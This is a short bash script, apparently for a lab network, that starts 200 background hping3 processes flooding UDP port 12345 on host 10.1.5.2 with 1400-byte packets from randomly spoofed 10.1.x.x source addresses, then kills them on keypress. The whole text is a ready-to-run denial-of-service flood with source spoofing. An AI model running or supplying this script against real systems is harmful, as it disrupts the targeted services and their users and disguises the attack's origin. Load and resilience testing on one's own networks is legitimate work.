for i in {1..100}; do
   RANDOM_IP="10.1.$((RANDOM % 256)).$((RANDOM % 256))"
   sudo hping3 -I eth1 -2 -p 12345 -d 1400 --flood -a $RANDOM_IP 10.1.5.2 &
 done
for i in {1..100}; do
   RANDOM_IP="10.1.$((RANDOM % 256)).$((RANDOM % 256))"
   sudo hping3 -I eth1 -2 -p 12345 -d 1400 --flood -a $RANDOM_IP 10.1.5.2 & 
done
read
sudo pkill hping3
